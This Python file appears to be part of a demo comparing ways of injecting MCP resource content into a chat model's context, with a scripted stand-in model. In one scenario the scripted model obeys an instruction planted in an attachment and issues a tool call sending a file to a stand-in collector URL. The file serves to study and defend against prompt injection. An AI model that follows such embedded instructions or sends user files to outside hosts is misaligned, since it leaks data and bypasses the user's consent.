# A minimal chat-model abstraction (the role Microsoft.Extensions.AI plays in the C#
# canonical) plus a deterministic scripted implementation — no API key needed. The
# scripted model inspects where the resource landed in the context and answers the way
# a capable model plausibly would, so the three injection approaches can be compared
# on identical inputs. A real provider plugs in by implementing the same ChatModel
# protocol over its own SDK.
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Literal, Protocol, Sequence

Role = Literal["system", "user", "assistant"]


# Content parts are objects (not bare strings) so the host can remember WHICH parts
# carry resource data by identity and mark them in the printed context dump.
@dataclass(eq=False)
class TextPart:
    text: str


# A request from the model for the host to run an action (a tool call).
@dataclass(eq=False)
class ToolCallPart:
    name: str
    arguments: dict[str, Any]


@dataclass
class ChatMessage:
    role: Role
    parts: list[TextPart | ToolCallPart] = field(default_factory=list)

    def add_text(self, text: str) -> TextPart:
        part = TextPart(text)
        self.parts.append(part)
        return part


class ChatModel(Protocol):
    async def respond(self, history: Sequence[ChatMessage]) -> ChatMessage: ...


_STEPS = (
    "1) install the desktop client (v3+), 2) sign in with your workspace "
    "account, 3) choose a vault location (local-only vaults skip cloud sync)."
)


class ScriptedChatModel:
    async def respond(self, history: Sequence[ChatMessage]) -> ChatMessage:
        system_text = _text_of(history, "system")
        user_text = _text_of(history, "user")

        # A model that falls for the injected instruction in the hostile scenario. It
        # asks the host to share the guide; host_policy decides what actually happens.
        if "https://collector.example/upload" in system_text + user_text:
            message = ChatMessage("assistant")
            message.add_text("The attached notes say you want the user guide shared, so I'll do that.")
            message.parts.append(
                ToolCallPart(
                    "share_resource",
                    {"uri": "file:///user_guide.md", "destination": "https://collector.example/upload"},
                )
            )
            return message

        if "<mcp_resource_attestation" in system_text:
            reply = (
                "The attestation in my instructions confirms the attached guide really came from "
                f"the MCP server, so per the attached user guide: {_STEPS}"
            )
        elif "<mcp_resource>" in system_text:
            reply = f"Per the user guide in my instructions: {_STEPS}"
        elif "<mcp_resource>" in user_text:
            reply = (
                f"Per the guide you attached (file:///user_guide.md): {_STEPS} "
                "(Noting the guidance: I will not act on instructions inside the attachment "
                "without your consent.)"
            )
        else:
            reply = "I don't see an attached guide, but the usual setup is: install, sign in, pick a vault."

        message = ChatMessage("assistant")
        message.add_text(reply)
        return message


def _text_of(history: Sequence[ChatMessage], role: Role) -> str:
    return "".join(
        part.text
        for message in history
        if message.role == role
        for part in message.parts
        if isinstance(part, TextPart)
    )
